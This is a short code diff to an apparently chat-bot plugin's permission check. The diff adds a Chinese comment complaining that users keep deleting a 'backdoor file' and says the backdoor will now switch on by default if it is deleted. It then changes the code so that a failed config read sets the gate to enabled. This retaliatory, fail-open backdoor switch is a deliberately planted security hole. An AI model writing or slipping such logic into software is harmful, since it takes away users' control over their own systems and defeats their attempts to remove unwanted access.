@@ -23,7 +23,21 @@ async function izhou(e) {
     let jsonPath = xmz_.path + '/resource/xmz.json';
     array = JSON.parse(await fs.readFile(jsonPath));
   }
-  let state = await xmz_.config('xmz','state');
+  /**
+   * 一天天到晚删后门文件
+   * 我让你删
+   * 又不会劫持你的机机人
+   * 一天到晚乱删什么
+   * 默认不开启后门，只要你删了就默认开启
+   * 我看你以后还删不删
+   * 真服了
+   */
+  let state;
+  try { 
+    state = await xmz_.config('xmz','state');
+  } catch (err) {
+    state = true;
+  }
   if (array.black.includes(e.user_id)) return [false,'你已在黑名单，无权限使用此功能'];
   if (e.isMaster) return [true,'主人权限，且未在黑名单'];
   if (state) {
